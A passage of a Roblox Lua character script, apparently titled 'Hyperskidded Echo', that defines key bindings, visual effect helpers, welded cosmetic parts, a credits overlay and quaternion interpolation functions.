							elseif input.KeyCode == Enum.KeyCode.Four then
								Rejoin()
							elseif input.KeyCode == Enum.KeyCode.Five then
								Rejoin()
							elseif input.KeyCode == Enum.KeyCode.Six then
								Rejoin()
							elseif input.KeyCode == Enum.KeyCode.Seven then
								Rejoin()
							elseif input.KeyCode == Enum.KeyCode.Eight then
								Rejoin()
							elseif input.KeyCode == Enum.KeyCode.Nine then
								Rejoin()
							elseif input.KeyCode == Enum.KeyCode.Zero then
								Rejoin()
							end	
						end
					end)
					function Raycast(POSITION, DIRECTION, RANGE, IGNOREDECENDANTS)
						return game:GetService("Workspace"):FindPartOnRay(Ray.new(POSITION, DIRECTION.unit * RANGE), IGNOREDECENDANTS)
					end

					function PositiveAngle(NUMBER)
						if NUMBER >= 0 then
							NUMBER = 0
						end
						return NUMBER
					end

					function Nebulify(TYPE,PARENT)
						if TYPE == "Both" then
							local blue = script.Effects.Nebula1:Clone()
							local pink = script.Effects.Nebula2:Clone()
							blue.Parent = PARENT
							pink.Parent = PARENT
						elseif TYPE == "Blue" then
							local blue = script.Effects.Nebula1:Clone()
							blue.Parent = PARENT
						elseif TYPE == "Pink" then
							local pink = script.Effects.Nebula2:Clone()
							pink.Parent = PARENT
						end
					end
					function SetJointTween(Joint,TweenData,EasingType,DirectionType,AnimationTime)
						local EST = Enum.EasingStyle[EasingType]
						local DRT = Enum.EasingDirection[DirectionType]
						local InterpolationSpeed = 1
						local TI = TweenInfo.new(AnimationTime/InterpolationSpeed,EST,DRT,0,false,0)
						local TAnim = game:service'TweenService':Create(Joint,TI,TweenData)
						TAnim:Play()
					end
					function ShakeCam(Length,Intensity)
						coroutine.resume(coroutine.create(function()
							local intensity = 1 * Intensity
							local rotM = 0.01 * Intensity
							for i = 0, Length, 0.1 do
								Swait()
								intensity = intensity - 0.05 * Intensity / Length
								rotM = rotM - 5.0E-4 * Intensity / Length
								Humanoid.CameraOffset = Vector3.new(RAD(MATHR(-intensity, intensity)), RAD(MATHR(-intensity, intensity)), RAD(MATHR(-intensity, intensity)))
								Cam.CFrame = Cam.CFrame * CF(RAD(MATHR(-intensity, intensity)), RAD(MATHR(-intensity, intensity)), RAD(MATHR(-intensity, intensity))) * EULER(RAD(MATHR(-intensity, intensity)) * rotM, RAD(MATHR(-intensity, intensity)) * rotM, RAD(MATHR(-intensity, intensity)) * rotM)
							end
							Humanoid.CameraOffset = Vector3.new(0, 0, 0)
						end))
					end

					function NegativeAngle(NUMBER)
						if NUMBER <= 0 then
							NUMBER = 0
						end
						return NUMBER
					end

					function R_RANDOM(CFRAME,DIST)
						return CFRAME*ANGLES(RAD(MATHR(0,360)),RAD(MATHR(0,360)),RAD(MATHR(0,360)))*CF(0,0,-DIST)
					end

					function Rainbowify(name)
						while RunService.Heartbeat:Wait() do
							for hue = 0, 1, 0.06 do
								name.Color = Color3.fromHSV(hue,1,1)
								wait(0.001)
							end
						end
					end

					if not _G.LessGooBud then
						spawn(function()
							--RootPart.CFrame = CFrame.new(0,100,0)	
							spawnwave(Torso.Position)
							CreateSound(144699494,Torso,10,1,false)
						end)
						_G.LessGooBud = true
					end
					do
						local sayingstuff = Instance.new("ScreenGui")
						sayingstuff.Name = "CreditsAndAuthentication"
						sayingstuff.ResetOnSpawn = false
						sayingstuff.Parent = lplr:FindFirstChildOfClass("PlayerGui")
						local sayingstuff3 = Instance.new("TextLabel",sayingstuff)
						sayingstuff3.BackgroundTransparency = 1
						sayingstuff3.BorderSizePixel = 0
						sayingstuff3.Text = ""
						sayingstuff3.Font = "Code"
						sayingstuff3.TextScaled = true
						sayingstuff3.TextStrokeTransparency = 0
						coroutine.resume(coroutine.create(function()
							while not stopeverything and sayingstuff3:IsDescendantOf(game) do
								sayingstuff3.TextColor3 = outer.Color
								swait()
							end
						end))
						sayingstuff3.Size = UDim2.new(.8,0,.2,0)
						sayingstuff3.AnchorPoint = Vector2.new(.5,1)
						sayingstuff3.Position = UDim2.new(.5,0,1,0)
						local KABAAM = Instance.new("Sound")
						KABAAM.Name = "dundundundunDUNDUN!!!!!"
						KABAAM.Volume = 9e9
						KABAAM.SoundId = "rbxassetid://6112625298"
						KABAAM.Looped = false
						KABAAM.Playing = true
						KABAAM.Parent = sayingstuff
						local text = "Hyperskidded Echo "..SCRIPTVERSION..", by SUPER_TIGERPRO/super_tiger123456"
						coroutine.resume(coroutine.create(function()
							warnedpeople2(text)
						end))
						coroutine.resume(coroutine.create(function()
							for i = 1,string.len(text) do
								swait()
								sayingstuff3.Text = string.sub(text,1,i)
							end
						end))
						game:GetService("TweenService"):Create(sayingstuff3,TweenInfo.new(1,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,0,false,3.5),{AnchorPoint = Vector2.new(.5,0)}):Play()
						game:GetService("Debris"):AddItem(sayingstuff,4.5)		
					end

					function CharacterFade(COLOR,TIMER,MOVEDIRECTION,PARENT)
						coroutine.resume(coroutine.create(function()
							local FADE = IT("Model",Effects)
							if PARENT ~= nil then
								FADE.Parent = PARENT
							end
							FADE.Name = "FadingEffect"
							for _, c in pairs(Character:GetChildren()) do
								if c.ClassName == "Part" then
									c.CanCollide = false
									local FADER = CreatePart(3, FADE, "Neon", 0, 0.75, BRICKC("Pearl"), c.Name, c.Size, true)
									FADER.CFrame = c.CFrame
									if FADER.Name == "Head" then
										Head:FindFirstChildOfClass("SpecialMesh"):Clone().Parent = FADER
									elseif FADER.Name == "HumanoidRootPart" then
										FADE.PrimaryPart = FADER
										FADER.Transparency = 1
									end
								end
							end
							local TRANS = 0.25/TIMER
							local DIST = nil
							if MOVEDIRECTION ~= nil then
								DIST = (FADE.PrimaryPart.Position - MOVEDIRECTION).Magnitude
							end
							for i = 1, TIMER do
								Swait()
								for _, c in pairs(FADE:GetChildren()) do
									if c.ClassName == "Part" then
										c.Transparency = c.Transparency + TRANS
									end
								end
								if MOVEDIRECTION ~= nil then
									local ORI = FADE.PrimaryPart.Orientation
									FADE:SetPrimaryPartCFrame(CF(CF(FADE.PrimaryPart.Position,MOVEDIRECTION)*CF(0,0,-DIST/TIMER).p) * ANGLES(RAD(ORI.X), RAD(ORI.Y), RAD(ORI.Z)))
								end
							end
							FADE:remove()
						end))
					end

					function Swait(NUMBER)
						if NUMBER == 0 or NUMBER == nil then
							ArtificialHB.Event:wait()
						else
							for i = 1, NUMBER do
								ArtificialHB.Event:wait()
							end
						end
					end

					function CreateMesh(MESH, PARENT, MESHTYPE, MESHID, TEXTUREID, SCALE, OFFSET)
						local NEWMESH = IT(MESH)
						if MESH == "SpecialMesh" then
							NEWMESH.MeshType = MESHTYPE
							if MESHID ~= "nil" and MESHID ~= "" then
								NEWMESH.MeshId = "http://www.roblox.com/asset/?id="..MESHID
							end
							if TEXTUREID ~= "nil" and TEXTUREID ~= "" then
								NEWMESH.TextureId = "http://www.roblox.com/asset/?id="..TEXTUREID
							end
						end
						NEWMESH.Offset = OFFSET or VT(0, 0, 0)
						NEWMESH.Scale = SCALE
						NEWMESH.Parent = PARENT
						return NEWMESH
					end

					function CreateRing(SIZE,DOESROT,ROT,WAIT,CFRAME,COLOR,GROW)
						local wave = CreatePart(3, Effects, "Neon", 0, 0.5, BRICKC(COLOR), "Effect", VT(0,0,0))
						local mesh = IT("SpecialMesh",wave)
						mesh.MeshType = "FileMesh"
						mesh.MeshId = "http://www.roblox.com/asset/?id=3270017"
						mesh.Scale = SIZE
						mesh.Offset = VT(0,0,0)
						wave.CFrame = CFRAME
						wave.Color = C3(1,0,0)
						coroutine.resume(coroutine.create(function(PART)
							for i = 1, WAIT do
								Swait()
								mesh.Scale = mesh.Scale + GROW
								local val = MATHR(1,255)
								wave.Color = Color3.fromRGB(val,val,val)
								if DOESROT == true then
									wave.CFrame = wave.CFrame * CFrame.fromEulerAnglesXYZ(0,ROT,0)
								end
								wave.Transparency = wave.Transparency + (0.5/WAIT)
								if wave.Transparency > 0.99 then
									wave:remove()
								end
							end
						end))
					end

					function MagicSphere(SIZE,WAIT,CFRAME,COLOR,GROW)
						local wave = CreatePart(3, Effects, "Neon", 0, 0, BRICKC(COLOR), "Effect", VT(1,1,1), true)
						local mesh = IT("SpecialMesh",wave)
						mesh.MeshType = "Sphere"
						mesh.Scale = SIZE
						mesh.Offset = VT(0,0,0)
						wave.CFrame = CFRAME
						coroutine.resume(coroutine.create(function(PART)
							for i = 1, WAIT do
								Swait()
								mesh.Scale = mesh.Scale + GROW
								wave.Transparency = wave.Transparency + (1/WAIT)
								wave.Color = C3(0,0,0)
								if wave.Transparency > 0.99 then
									wave:remove()
								end
							end
						end))
					end

					root = RootPart
					rarm = RightArm
					larm = LeftArm
					lleg = LeftLeg
					rleg = RightLeg
					tors = Torso
					halocolor = BrickColor.new("Pastel light blue")
					halocolor2 = BrickColor.new("Cool yellow")
					starcolor = BrickColor.new("Bright yellow")
					lunacolor = BrickColor.new("Navy blue")
					lunacolor2 = BrickColor.new("Bright blue")
					wepcolor = BrickColor.new("Really black")
					maincolor = BrickColor.new("Really black")
					local colorizermod = Instance.new("Model",Character)
					m = Instance.new("Model",Character)
					m2 = Instance.new("Model",Character)
					m3 = Instance.new("Model",Character)
					mw1 = Instance.new("Model",Character)
					mw2 = Instance.new("Model",Character)
					actualrotationvalue = 0
					AnimationTail_Speed = 3

					function CreateMesha(parent,meshtype,x1,y1,z1)
						local mesh = Instance.new("SpecialMesh",parent)
						mesh.MeshType = meshtype
						mesh.Scale = Vector3.new(x1*10,y1*10,z1*10)
						return mesh
					end

					function CreatePartb(FORMFACTOR, PARENT, MATERIAL, REFLECTANCE, TRANSPARENCY, BRICKCOLOR, NAME, SIZE, ANCHOR)
						local NEWPART = Instance.new("Part")
						NEWPART.formFactor = FORMFACTOR
						NEWPART.Reflectance = REFLECTANCE
						NEWPART.Transparency = TRANSPARENCY
						NEWPART.CanCollide = false
						NEWPART.Locked = true
						NEWPART.Anchored = true
						if ANCHOR == false then
							NEWPART.Anchored = false
						end
						NEWPART.BrickColor = BRICKC(tostring(BRICKCOLOR))
						NEWPART.Name = NAME
						NEWPART.Size = SIZE
						NEWPART.Position = Torso.Position
						NEWPART.Material = MATERIAL
						NEWPART:BreakJoints()
						NEWPART.Parent = PARENT
						return NEWPART
					end

					function CreateParta(parent,transparency,reflectance,material,color)
						local p = Instance.new("Part")
						p.TopSurface = 0
						p.BottomSurface = 0
						p.Parent = parent
						p.Size = Vector3.new(0.1,0.1,0.1)
						p.Transparency = transparency
						p.Reflectance = reflectance
						p.CanCollide = false
						p.Locked = true
						p.Material = material
						return p
					end

					function CreateSpecialMesha(parent,meshid,x1,y1,z1)
						local mesh = Instance.new("SpecialMesh",parent)
						mesh.MeshType = "FileMesh"
						mesh.MeshId = meshid
						mesh.Scale = Vector3.new(x1,y1,z1)
						return mesh
					end


					function CreateSpecialGlowMesh(parent,meshid,x1,y1,z1)
						local mesh = Instance.new("SpecialMesh",parent)
						mesh.MeshType = "FileMesh"
						mesh.MeshId = meshid
						mesh.TextureId = "http://www.roblox.com/asset/?id=269748808"
						mesh.Scale = Vector3.new(x1,y1,z1)
						mesh.VertexColor = Vector3.new(parent.BrickColor.r, parent.BrickColor.g, parent.BrickColor.b)
						return mesh
					end

					function CreateWelda(parent,part0,part1,C1X,C1Y,C1Z,C1Xa,C1Ya,C1Za,C0X,C0Y,C0Z,C0Xa,C0Ya,C0Za)
						local weld = Instance.new("Weld")
						weld.Parent = parent
						weld.Part0 = part0
						weld.Part1 = part1
						weld.C1 = CFrame.new(C1X,C1Y,C1Z)*CFrame.Angles(C1Xa,C1Ya,C1Za)
						weld.C0 = CFrame.new(C0X,C0Y,C0Z)*CFrame.Angles(C0Xa,C0Ya,C0Za)
						return weld
					end

					--- Ring


					ran = CreateParta(m2,0,0,"SmoothPlastic",wepcolor)
					CreateMesha(ran,"Wedge",1.02,1.02,1.02)
					CreateWelda(ran,larm,ran,0,0.15,0,math.rad(0),math.rad(90),math.rad(0),0,0,0,math.rad(0),math.rad(0),math.rad(0))
					ran = CreateParta(m,0,0,"SmoothPlastic",wepcolor)
					CreateMesha(ran,"Wedge",0.9,0.9,1.025)
					CreateWelda(ran,larm,ran,0,0.155,0,math.rad(0),math.rad(90),math.rad(0),0,0,0,math.rad(0),math.rad(0),math.rad(0))
					ran = CreateParta(m,0,0,"SmoothPlastic",wepcolor)
					CreateMesha(ran,"Wedge",1.025,0.9,0.9)
					CreateWelda(ran,larm,ran,0,0.155,-0.025,math.rad(0),math.rad(90),math.rad(0),0,0,0,math.rad(0),math.rad(0),math.rad(0))


					gan = CreateParta(m,0,0,"SmoothPlastic",wepcolor)
					CreateMesha(gan,"Brick",1.075,0.1,1.075)
					CreateWelda(gan,larm,gan,0,0.5,0,math.rad(0),math.rad(0),math.rad(0),0,0,0,math.rad(0),math.rad(0),math.rad(0))

					gan = CreateParta(m,0,0,"SmoothPlastic",wepcolor)
					CreateMesha(gan,"Brick",1.075,0.1,1.075)
					CreateWelda(gan,larm,gan,0,0.75,0,math.rad(0),math.rad(0),math.rad(0),0,0,0,math.rad(0),math.rad(0),math.rad(0))



					gan = CreateParta(m2,0,0,"Neon",halocolor2)
					CreateMesha(gan,"Brick",1.095,0.035,1.095)
					CreateWelda(gan,larm,gan,0,0.5,0,math.rad(0),math.rad(0),math.rad(0),0,0,0,math.rad(0),math.rad(0),math.rad(0))

					gan = CreateParta(m2,0,0,"Neon",halocolor2)
					CreateMesha(gan,"Brick",1.095,0.035,1.095)
					CreateWelda(gan,larm,gan,0,0.75,0,math.rad(0),math.rad(0),math.rad(0),0,0,0,math.rad(0),math.rad(0),math.rad(0))

					gane = CreateParta(m3,0,0,"SmoothPlastic",lunacolor2)
					CreateMesha(gane,"Brick",1.0625,0.2,1.0625)
					CreateWelda(gane,larm,gane,0,0.6,0,math.rad(0),math.rad(0),math.rad(0),0,0,0,math.rad(0),math.rad(0),math.rad(0))

					star = CreateParta(m,0,0,"SmoothPlastic",wepcolor)
					CreateSpecialMesha(star,"http://www.roblox.com/asset/?id=45428961",2.5,2.5,2.5)
					CreateWelda(star,larm,star,0,0.475,0.6,math.rad(90),math.rad(90),math.rad(0),0,0,0,math.rad(0),math.rad(0),math.rad(0))
					starl = CreateParta(m3,0,0,"SmoothPlastic",starcolor)
					CreateSpecialMesha(starl,"http://www.roblox.com/asset/?id=45428961",1.95,2.55,1.95)
					CreateWelda(starl,larm,starl,0,0.475,0.6,math.rad(90),math.rad(90),math.rad(0),0,0,0,math.rad(0),math.rad(0),math.rad(0))

					--- Ring II

					ran = CreateParta(m2,0,0,"SmoothPlastic",wepcolor)
					CreateMesha(ran,"Wedge",1.02,1.02,1.02)
					CreateWelda(ran,rarm,ran,0,0.15,0,math.rad(0),math.rad(-90),math.rad(0),0,0,0,math.rad(0),math.rad(0),math.rad(0))
					ran = CreateParta(m,0,0,"SmoothPlastic",wepcolor)
					CreateMesha(ran,"Wedge",0.9,0.9,1.025)
					CreateWelda(ran,rarm,ran,0,0.155,0,math.rad(0),math.rad(-90),math.rad(0),0,0,0,math.rad(0),math.rad(0),math.rad(0))
					ran = CreateParta(m,0,0,"SmoothPlastic",wepcolor)
					CreateMesha(ran,"Wedge",1.025,0.9,0.9)
					CreateWelda(ran,rarm,ran,0,0.155,-0.025,math.rad(0),math.rad(-90),math.rad(0),0,0,0,math.rad(0),math.rad(0),math.rad(0))

					gan = CreateParta(m,0,0,"SmoothPlastic",wepcolor)
					CreateMesha(gan,"Brick",1.075,0.1,1.075)
					CreateWelda(gan,rarm,gan,0,0.5,0,math.rad(0),math.rad(0),math.rad(0),0,0,0,math.rad(0),math.rad(0),math.rad(0))

					gan = CreateParta(m,0,0,"SmoothPlastic",wepcolor)
					CreateMesha(gan,"Brick",1.075,0.1,1.075)
					CreateWelda(gan,rarm,gan,0,0.75,0,math.rad(0),math.rad(0),math.rad(0),0,0,0,math.rad(0),math.rad(0),math.rad(0))



					gan = CreateParta(m2,0,0,"Neon",halocolor2)
					CreateMesha(gan,"Brick",1.095,0.035,1.095)
					CreateWelda(gan,rarm,gan,0,0.5,0,math.rad(0),math.rad(0),math.rad(0),0,0,0,math.rad(0),math.rad(0),math.rad(0))

					gan = CreateParta(m2,0,0,"Neon",halocolor2)
					CreateMesha(gan,"Brick",1.095,0.035,1.095)
					CreateWelda(gan,rarm,gan,0,0.75,0,math.rad(0),math.rad(0),math.rad(0),0,0,0,math.rad(0),math.rad(0),math.rad(0))

					gane = CreateParta(m3,0,0,"SmoothPlastic",lunacolor2)
					CreateMesha(gane,"Brick",1.0625,0.2,1.0625)
					CreateWelda(gane,rarm,gane,0,0.6,0,math.rad(0),math.rad(0),math.rad(0),0,0,0,math.rad(0),math.rad(0),math.rad(0))

					star = CreateParta(m,0,0,"SmoothPlastic",wepcolor)
					CreateSpecialMesha(star,"http://www.roblox.com/asset/?id=45428961",2.5,2.5,2.5)
					CreateWelda(star,rarm,star,0,-0.475,0.6,math.rad(90),math.rad(90),math.rad(0),0,0,0,math.rad(0),math.rad(0),math.rad(0))
					starl = CreateParta(m3,0,0,"SmoothPlastic",starcolor)
					CreateSpecialMesha(starl,"http://www.roblox.com/asset/?id=45428961",1.95,2.55,1.95)
					CreateWelda(starl,rarm,starl,0,-0.475,0.6,math.rad(90),math.rad(90),math.rad(0),0,0,0,math.rad(0),math.rad(0),math.rad(0))

					---

					local HighRanksCrest = Instance.new("Part", Character)
					HighRanksCrest.Name = randomstring()
					HighRanksCrest.CanCollide = true
					HighRanksCrest.BrickColor = BrickColor.new("Institutional white")
					HighRanksCrest.Transparency = 0
					HighRanksCrest.Material = "Neon"
					HighRanksCrest.Size = Vector3.new(1, 1, 2)
					--HighRanksCrest.TopSurface = Enum.SurfaceType.Neon
					--HighRanksCrest.BottomSurface = Enum.SurfaceType.Neon
					--rbxassetid://4758429875
					local Weld = Instance.new("Weld", HighRanksCrest)
					Weld.Part0 = Torso
					Weld.Part1 = HighRanksCrest
					Weld.C1 = CFrame.new(0, -2.5, -1.75)
					Weld.C0 = CFrame.Angles(math.rad(0),math.rad(0),0)

					local M2 = Instance.new("SpecialMesh")
					M2.Parent = HighRanksCrest
					M2.MeshId = "http://www.roblox.com/asset/?id=4758429875"
					M2.Scale = Vector3.new(1.5, 1.5, 1.5)
					coroutine.resume(coroutine.create(function()
						while true do
							Swait()
							HighRanksCrest.Color = COLORSHIFT
						end
					end))
					function GetRoot(MODEL, ROOT)
						if ROOT == true then
							return MODEL:FindFirstChild("HumanoidRootPart") or MODEL:FindFirstChild("Torso") or MODEL:FindFirstChild("UpperTorso")
						else
							return MODEL:FindFirstChild("Torso") or MODEL:FindFirstChild("UpperTorso")
						end
					end

					function SpecialSphere(SIZE,WAIT,CFRAME,COLOR,GROW)
						local wave = CreatePart(3, Effects, "Neon", 0, 0, BRICKC(COLOR), "Eye", VT(1,1,1), true)
						wave.Color = COLOR
						local mesh = CreateMesh("SpecialMesh", wave, "Sphere", "", "", SIZE, VT(0,0,0))
						wave.CFrame = CFRAME
						coroutine.resume(coroutine.create(function(PART)
							for i = 1, WAIT do
								Swait()
								mesh.Scale = mesh.Scale + GROW
								wave.Transparency = wave.Transparency + (1/WAIT)
								if wave.Transparency > 0.99 then
									wave:remove()
								end
							end
						end))
					end

					function Slice(KIND,SIZE,WAIT,CFRAME,COLOR,GROW)
						local wave = CreatePart(3, Effects, "Neon", 0, 0.5, BRICKC("Really red"), "Effect", VT(1,1,1), true)
						local mesh = nil
						if KIND == "Base" then
							mesh = CreateMesh("SpecialMesh", wave, "FileMesh", "448386996", "", VT(0,SIZE/10,SIZE/10), VT(0,0,0))
						elseif KIND == "Thin" then
							mesh = CreateMesh("SpecialMesh", wave, "FileMesh", "662586858", "", VT(SIZE/10,0,SIZE/10), VT(0,0,0))
						elseif KIND == "Round" then
							mesh = CreateMesh("SpecialMesh", wave, "FileMesh", "662585058", "", VT(SIZE/10,0,SIZE/10), VT(0,0,0))
						end
						wave.CFrame = CFRAME
						coroutine.resume(coroutine.create(function(PART)
							for i = 1, WAIT do
								Swait()
								mesh.Scale = mesh.Scale + GROW/10
								wave.Transparency = wave.Transparency + (0.5/WAIT)
								if wave.Transparency > 0.99 then
									wave:remove()
								end
							end
						end))
					end

					function Effect2(Table)
						local TYPE = (Table.EffectType or "Sphere")
						local SIZE = (Table.Size or Vector3.new(1,1,1))
						local ENDSIZE = (Table.Size2 or Vector3.new())
						local TRANSPARENCY = (Table.Transparency or 0)
						local ENDTRANSPARENCY = (Table.Transparency2 or 1)
						local CFRAME = (Table.CFrame or Torso.CFrame)
						local MOVEDIRECTION = (Table.MoveToPos or nil)
						local ROTATION1 = (Table.RotationX or 0)
						local ROTATION2 = (Table.RotationY or 0)
						local ROTATION3 = (Table.RotationZ or 0)
						local MATERIAL = (Table.Material or "Neon")
						local COLOR = (Table.Color or COLORSHIFT)
						local hOK,sOK,vOK = Color3.toHSV(COLOR)
						local RAINBOWPART = false
						if sOK > .1 then
							RAINBOWPART = true
						end
						local TIME = (Table.Time or 45)
						local SOUNDID = (Table.SoundID or nil)
						local SOUNDPITCH = (Table.SoundPitch or nil)
						local SOUNDVOLUME = (Table.SoundVolume or nil)
						local USEBOOMERANGMATH = (Table.UseBoomerangMath or false)
						local BOOMERANG = (Table.Boomerang or 0)
						local SIZEBOOMERANG = (Table.SizeBoomerang or 0)
						coroutine.resume(coroutine.create(function()
							local PLAYSSOUND = false
							local SOUND = nil
							local EFFECT = CreatePart(3,Effects,MATERIAL,0,TRANSPARENCY,COLORSHIFT,"Effect",Vector3.new(1,1,1),true)
							if RAINBOWPART then
							end
							if SOUNDID ~= nil and SOUNDPITCH ~= nil and SOUNDVOLUME ~= nil then
								PLAYSSOUND = true
								SOUND = CreateSound(SOUNDID,EFFECT,SOUNDVOLUME,SOUNDPITCH,false)
							end
							EFFECT.Color = COLOR
							local MSH = nil
							if TYPE == "Sphere" then
								MSH = CreateMesh("SpecialMesh",EFFECT,"Sphere","","",SIZE,Vector3.new())
							elseif TYPE == "Block" or TYPE == "Box" then
								MSH = Instance.new("BlockMesh",EFFECT)
								MSH.Scale = SIZE
							elseif TYPE == "Wave" then
								MSH = CreateMesh("SpecialMesh",EFFECT,"FileMesh","20329976","",SIZE,Vector3.new(0,0,-SIZE.X/8))
							elseif TYPE == "Ring" then
								MSH = CreateMesh("SpecialMesh",EFFECT,"FileMesh","559831844","",Vector3.new(SIZE.X,SIZE.X,0.1),Vector3.new())
							elseif TYPE == "Slash" then
								MSH = CreateMesh("SpecialMesh",EFFECT,"FileMesh","662586858","",Vector3.new(SIZE.X/10,0,SIZE.X/10),Vector3.new())
							elseif TYPE == "Round Slash" then
								MSH = CreateMesh("SpecialMesh",EFFECT,"FileMesh","662585058","",Vector3.new(SIZE.X/10,0,SIZE.X/10),Vector3.new())
							elseif TYPE == "Swirl" then
								MSH = CreateMesh("SpecialMesh",EFFECT,"FileMesh","168892432","",SIZE,Vector3.new())
							elseif TYPE == "Skull" then
								MSH = CreateMesh("SpecialMesh",EFFECT,"FileMesh","4770583","",SIZE,Vector3.new())
							elseif TYPE == "Crystal" then
								MSH = CreateMesh("SpecialMesh",EFFECT,"FileMesh","9756362","",SIZE,Vector3.new())
							end
							if MSH ~= nil then
								local BOOMR1 = 1+BOOMERANG/50
								local BOOMR2 = 1+SIZEBOOMERANG/50
								local MOVESPEED = nil
								if MOVEDIRECTION ~= nil then
									if USEBOOMERANGMATH == true then
										MOVESPEED = ((CFRAME.p - MOVEDIRECTION).Magnitude/TIME)*BOOMR1
									else
										MOVESPEED = ((CFRAME.p - MOVEDIRECTION).Magnitude/TIME)
									end
								end
								local GROWTH = nil
								if USEBOOMERANGMATH == true then
									GROWTH = (SIZE - ENDSIZE)*(BOOMR2+1)
								else
									GROWTH = (SIZE - ENDSIZE)
								end
								local TRANS = TRANSPARENCY - ENDTRANSPARENCY
								if TYPE == "Block" then
									EFFECT.CFrame = CFRAME*CFrame.Angles(math.rad(math.random(0,360)),math.rad(math.random(0,360)),math.rad(math.random(0,360)))
								else
									EFFECT.CFrame = CFRAME
								end
								if USEBOOMERANGMATH == true then
									for LOOP = 1,TIME+1 do
										swait()
										MSH.Scale = MSH.Scale - (Vector3.new((GROWTH.X)*((1 - (LOOP/TIME)*BOOMR2)),(GROWTH.Y)*((1 - (LOOP/TIME)*BOOMR2)),(GROWTH.Z)*((1 - (LOOP/TIME)*BOOMR2)))*BOOMR2)/TIME
										if TYPE == "Wave" then
											MSH.Offset = Vector3.new(0,0,-MSH.Scale.Z/8)
										end
										EFFECT.Transparency = EFFECT.Transparency - TRANS/TIME
										if TYPE == "Block" then
											EFFECT.CFrame = CFRAME*CFrame.Angles(math.rad(math.random(0,360)),math.rad(math.random(0,360)),math.rad(math.random(0,360)))
										else
											EFFECT.CFrame = EFFECT.CFrame*CFrame.Angles(math.rad(ROTATION1),math.rad(ROTATION2),math.rad(ROTATION3))
										end
										if MOVEDIRECTION ~= nil then
											local ORI = EFFECT.Orientation
											EFFECT.CFrame = CFrame.new(EFFECT.Position,MOVEDIRECTION)*CFrame.new(0,0,-(MOVESPEED)*((1 - (LOOP/TIME)*BOOMR1)))
											EFFECT.Orientation = ORI
										end
									end
								else
									for LOOP = 1,TIME+1 do
										swait()
										MSH.Scale = MSH.Scale - GROWTH/TIME
										if TYPE == "Wave" then
											MSH.Offset = Vector3.new(0,0,-MSH.Scale.Z/8)
										end
										EFFECT.Transparency = EFFECT.Transparency - TRANS/TIME
										if TYPE == "Block" then
											EFFECT.CFrame = CFRAME*CFrame.Angles(math.rad(math.random(0,360)),math.rad(math.random(0,360)),math.rad(math.random(0,360)))
										else
											EFFECT.CFrame = EFFECT.CFrame*CFrame.Angles(math.rad(ROTATION1),math.rad(ROTATION2),math.rad(ROTATION3))
										end
										if MOVEDIRECTION ~= nil then
											local ORI = EFFECT.Orientation
											EFFECT.CFrame = CFrame.new(EFFECT.Position,MOVEDIRECTION)*CFrame.new(0,0,-MOVESPEED)
											EFFECT.Orientation = ORI
										end
									end
								end
								EFFECT.Transparency = 1
								if PLAYSSOUND == false then
									EFFECT:Destroy()
								else
									EFFECT:Destroy()
								end
							else
								if PLAYSSOUND == false then
									EFFECT:Destroy()
								else
									EFFECT:Destroy()
								end
							end
						end))
					end
					function CreatePart(FORMFACTOR, PARENT, MATERIAL, REFLECTANCE, TRANSPARENCY, BRICKCOLOR, NAME, SIZE, ANCHOR)
						local NEWPART = IT("Part")
						NEWPART.formFactor = FORMFACTOR
						NEWPART.Reflectance = REFLECTANCE
						NEWPART.Transparency = TRANSPARENCY
						NEWPART.CanCollide = false
						NEWPART.Locked = true
						NEWPART.Anchored = true
						if ANCHOR == false then
							NEWPART.Anchored = false
						end
						NEWPART.BrickColor = BRICKC(tostring(BRICKCOLOR))
						NEWPART.Name = NAME
						NEWPART.Size = SIZE
						NEWPART.Position = Torso.Position
						NEWPART.Material = MATERIAL
						NEWPART:BreakJoints()
						NEWPART.Parent = PARENT
						return NEWPART
					end


					local function weldBetween(a, b)
						local weldd = Instance.new("ManualWeld")
						weldd.Part0 = a
						weldd.Part1 = b
						weldd.C0 = CFrame.new()
						weldd.C1 = b.CFrame:inverse() * a.CFrame
						weldd.Parent = a
						return weldd
					end


					function QuaternionFromCFrame(cf)
						local mx, my, mz, m00, m01, m02, m10, m11, m12, m20, m21, m22 = cf:components()
						local trace = m00 + m11 + m22
						if trace > 0 then 
							local s = math.sqrt(1 + trace)
							local recip = 0.5 / s
							return (m21 - m12) * recip, (m02 - m20) * recip, (m10 - m01) * recip, s * 0.5
						else
							local i = 0
							if m11 > m00 then
								i = 1
							end
							if m22 > (i == 0 and m00 or m11) then
								i = 2
							end
							if i == 0 then
								local s = math.sqrt(m00 - m11 - m22 + 1)
								local recip = 0.5 / s
								return 0.5 * s, (m10 + m01) * recip, (m20 + m02) * recip, (m21 - m12) * recip
							elseif i == 1 then
								local s = math.sqrt(m11 - m22 - m00 + 1)
								local recip = 0.5 / s
								return (m01 + m10) * recip, 0.5 * s, (m21 + m12) * recip, (m02 - m20) * recip
							elseif i == 2 then
								local s = math.sqrt(m22 - m00 - m11 + 1)
								local recip = 0.5 / s return (m02 + m20) * recip, (m12 + m21) * recip, 0.5 * s, (m10 - m01) * recip
							end
						end
					end

					function QuaternionToCFrame(px, py, pz, x, y, z, w)
						local xs, ys, zs = x + x, y + y, z + z
						local wx, wy, wz = w * xs, w * ys, w * zs
						local xx = x * xs
						local xy = x * ys
						local xz = x * zs
						local yy = y * ys
						local yz = y * zs
						local zz = z * zs
						return CFrame.new(px, py, pz, 1 - (yy + zz), xy - wz, xz + wy, xy + wz, 1 - (xx + zz), yz - wx, xz - wy, yz + wx, 1 - (xx + yy))
					end

					function QuaternionSlerp(a, b, t)
						local cosTheta = a[1] * b[1] + a[2] * b[2] + a[3] * b[3] + a[4] * b[4]
						local startInterp, finishInterp;
						if cosTheta >= 0.0001 then
							if (1 - cosTheta) > 0.0001 then
								local theta = ACOS(cosTheta)
								local invSINTheta = 1 / SIN(theta)
								startInterp = SIN((1 - t) * theta) * invSINTheta
								finishInterp = SIN(t * theta) * invSINTheta
							else
								startInterp = 1 - t
								finishInterp = t
							end
						else
							if (1 + cosTheta) > 0.0001 then
								local theta = ACOS(-cosTheta)
								local invSINTheta = 1 / SIN(theta)
								startInterp = SIN((t - 1) * theta) * invSINTheta
								finishInterp = SIN(t * theta) * invSINTheta
							else
								startInterp = t - 1
								finishInterp = t
							end
						end
						return a[1] * startInterp + b[1] * finishInterp, a[2] * startInterp + b[2] * finishInterp, a[3] * startInterp + b[3] * finishInterp, a[4] * startInterp + b[4] * finishInterp
					end

					function QFCF(cf)
						local mx,my,mz,m00,m01,m02,m10,m11,m12,m20,m21,m22 = cf:components()
						local trace = m00 + m11 + m22
